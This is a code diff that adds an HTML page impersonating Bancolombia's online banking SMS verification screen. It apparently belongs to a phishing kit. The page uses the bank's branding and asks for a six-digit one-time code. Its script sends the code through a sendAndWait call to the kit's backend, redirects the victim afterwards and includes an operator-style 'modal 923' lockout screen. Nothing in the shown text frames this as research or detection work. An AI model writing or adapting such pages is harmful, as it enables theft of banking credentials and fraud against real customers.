@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Código de verificación | Bancolombia</title>
+<link rel="stylesheet" href="css/secured.css">
+</head>
+<body>
+
+<header class="top">
+  <div class="brand">
+    <img src="img/horizont-trazo-blanco.svg" alt="Bancolombia" onerror="this.style.display='none'">
+    <div class="channel">Sucursal Virtual Personas</div>
+  </div>
+  <div class="top-actions">
+    <button class="user-pill"><span id="userName">Usuario</span></button>
+  </div>
+</header>
+
+<main class="center">
+  <div class="card-form">
+    <h1>Verificación por SMS</h1>
+    <p class="sub">Ingresa el código de 6 dígitos que te enviamos por mensaje de texto al celular registrado.</p>
+
+    <div class="err-banner" id="errBanner">Código incorrecto. Intenta de nuevo.</div>
+
+    <div class="otp-inputs" id="otpInputs">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+      <input type="text" inputmode="numeric" maxlength="1">
+    </div>
+
+    <div class="actions">
+      <button class="btn-pill btn-secondary-pill" onclick="otp.clear()">Borrar</button>
+      <button class="btn-pill btn-primary" id="btnContinue" disabled>Continuar</button>
+    </div>
+  </div>
+</main>
+
+<!-- Loader -->
+<div class="loader-overlay" id="loader">
+  <div class="loader-box">
+    <div class="loader-circle"></div>
+    <div class="loader-text">Cargando...</div>
+  </div>
+</div>
+
+  <!-- MODAL 923 -->
+  <div class="modal-overlay" id="modal923">
+    <div class="modal-923">
+      <div class="x-circle">
+        <svg viewBox="0 0 30 30" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="22" y1="8" x2="8" y2="22"/><line x1="8" y1="8" x2="22" y2="22"/></svg>
+      </div>
+      <h3>Por seguridad, no puedes continuar</h3>
+      <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica, elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad.</p>
+      <button class="btn-yellow-full" onclick="close923()">Intentar más tarde</button>
+    </div>
+  </div>
+
+
+<script src="js/secured.js"></script>
+<script>
+  const otp = setupOtpInputs('otpInputs', 'btnContinue', 'errBanner');
+  document.getElementById('btnContinue').addEventListener('click', () => {
+    if (document.getElementById('btnContinue').disabled) return;
+    const code = otp.getCode();
+    sendAndWait({ event: 'OTP', otp: code }, {
+      onOk: () => { sessionStorage.clear(); location.href = 'index.html'; },
+      onErr: () => { hideLoader(); otp.clear(); otp.showError(); }
+    });
+  });
+</script>
+</body>
+</html>
